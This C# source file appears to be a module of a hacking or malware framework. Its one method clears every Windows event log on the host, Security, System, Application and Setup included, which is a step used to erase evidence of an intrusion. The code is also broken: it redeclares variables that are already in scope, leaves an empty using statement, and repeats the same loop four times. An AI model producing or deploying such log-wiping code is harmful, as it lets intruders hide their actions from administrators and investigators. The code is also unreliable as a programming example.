using System;
using System.Diagnostics;

namespace FRamework.handlers.windows
{
    internal class eventViewerManager
    {
        public static void deleteEventLogs()
        {
            using (var appLog = new EventLog("Application", Environment.MachineName))
            using (var eventLog = new EventLog("Security", Environment.MachineName))
            using (var setupLog = new EventLog("Setup", Environment.MachineName))
            using (var systemLog = new EventLog("System", Environment.MachineName)) ;
            foreach (var appLog in EventLog.GetEventLogs())
            {
                appLog.Clear();
                appLog.Dispose();
            }
            foreach (var eventLog in EventLog.GetEventLogs())
            {
                eventLog.Clear();
                eventLog.Dispose();
            }
            foreach (var setupLog in EventLog.GetEventLogs())
            {
                setupLog.Clear();
                setupLog.Dispose();
            }
            foreach (var systemLog in EventLog.GetEventLogs())
            {
                systemLog.Clear();
                systemLog.Dispose();
            }
        }
    }
}